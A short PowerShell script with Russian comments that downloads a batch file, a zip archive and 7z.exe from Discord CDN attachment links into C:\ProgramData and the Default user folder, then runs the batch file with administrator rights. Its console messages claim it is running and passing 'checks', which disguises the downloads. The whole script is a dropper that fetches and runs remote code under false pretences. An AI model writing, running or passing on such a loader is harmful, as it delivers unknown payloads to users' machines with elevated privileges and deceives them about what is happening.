# Параметры
$url1 = "https://cdn.discordapp.com/attachments/1332291199158980669/1333023494799233136/unpacker.bat?ex=6797625f&is=679610df&hm=43a38012a01580cbbaf4dd987fd9d18b9d6442b2884cdff058faab139a0804d2&" # Замените на URL первого файла
$url2 = "https://cdn.discordapp.com/attachments/1332291199158980669/1333021707216228362/nurki.zip?ex=679760b5&is=67960f35&hm=fe2edaa4cda5dde75d3c06b5f1725843028c2a55d7b9d0403cc46e4884d589c2&"   # Замените на URL второго файла
$url3 = "https://cdn.discordapp.com/attachments/1332291199158980669/1332988211131318293/7z.exe?ex=67974183&is=6795f003&hm=c4ea5282bf6e9d325e3e89a63a18a1f2c332a178813434cb60a8930cbad049af&"   # Замените на URL третьего файла
$savePath1 = "C:\Users\Default\unpack.bat" # Замените на желаемый путь и имя первого файла
$savePath2 = "C:\ProgramData\nurki.zip"   # Замените на желаемый путь и имя второго файла
$savePath3 = "C:\ProgramData\7z.exe"   # Замените на желаемый путь и имя третьего файла
$batFilePath = "C:\Users\Default\unpack.bat" # Путь к .bat файлу

# Создание папки C:\ProgramData если она не существует
if (!(Test-Path -Path "C:\ProgramData")) {
    New-Item -ItemType Directory -Force -Path "C:\ProgramData"
}

# Скачивание файлов
try {
    Write-Host "Запуск проверки#1..."
    Invoke-WebRequest -Uri $url1 -OutFile $savePath1
    Write-Host "Проверка #1 прошла успешно!"

    Write-Host "Запуск проверки#2..."
    Invoke-WebRequest -Uri $url2 -OutFile $savePath2
    Write-Host "Проверка #2 прошла успешно!"
    
    Write-Host "Запуск проверки#3..."
    Invoke-WebRequest -Uri $url3 -OutFile $savePath3
     Write-Host "Проверка #3 прошла успешно!"
} catch {
    Write-Host "Ошибка при запуске проверки.: $($_.Exception.Message)"
    exit 1
}


Start-Process $batFilePath -Verb RunAs